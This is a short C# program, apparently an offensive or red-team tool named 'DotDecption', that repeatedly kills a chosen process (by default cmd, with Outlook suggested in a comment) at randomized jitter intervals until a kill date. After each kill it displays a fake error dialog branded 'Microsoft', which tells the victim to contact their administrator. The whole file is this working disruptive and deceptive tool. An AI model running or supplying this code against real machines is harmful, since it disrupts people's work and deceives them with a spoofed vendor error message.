using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;

namespace DotDecption
{
    class Program
    {
        /// <summary>
        /// 
        /// </summary>
        /// <param name="Proccess name to kill">NameOfProcessToKill==outlook</param>
        /// <param name="jitter">offsetTime==5</param>
        /// <param name="KillDate">DateTimeNow+1</param>
        static void Main(string[] args)
        {
            string NameOfProcessToKill = "cmd";
            int offsetTime = 5;
            DateTime KillDate = DateTime.Now;
            KillDate.AddDays(1);

            try
            {
                if (args.Length==0)
                {
                    //guess its using defaults
                }
                else if (args.Length == 1)
                {
                    NameOfProcessToKill = args[0];
                }
                else if (args.Length == 2)
                {
                    NameOfProcessToKill = args[0];
                    offsetTime = Convert.ToInt32(args[1]);
                }
                else if (args.Length == 3)
                {
                    NameOfProcessToKill = args[0];
                    offsetTime = Convert.ToInt32(args[1]);
                    KillDate = Convert.ToDateTime(args[2]);
                }
                else
                {
                    Console.WriteLine("[!] To many args");
                    Environment.Exit(1);
                }

                    var t = Task.Run(() => KillProc(NameOfProcessToKill, offsetTime, KillDate));
                    t.Wait();
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Somethings gone wrong. Heres what we know " + e.Message.ToString());
            }
        }

        static int Jitter(int jitter)
        {
            Random rand = new Random(jitter);
            int j = rand.Next(3000, 60000);
            Console.WriteLine(j);
            return j;
        }

        static void KillProc(string ProcName,int offsetTime, DateTime KillDate)
        {
            try
            {
                while (KillDate != DateTime.Now)
                {
                    foreach (var process in Process.GetProcessesByName(ProcName))
                    {
                        process.Kill();
                        ShowMessageBoxERROR(ProcName);
                        Thread.Sleep(Jitter(offsetTime));
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Somethings gone wrong. Heres what we know " + e.Message.ToString());
            }
        }

        static void ShowMessageBoxERROR(string ProcName)
        {
            MessageBox.Show( ProcName.ToUpper() + " has expierenced a serious problem and needs to close.\nClick OK to continue and contact your machines administrator.", "Microsoft "+ProcName.ToUpper(), MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}
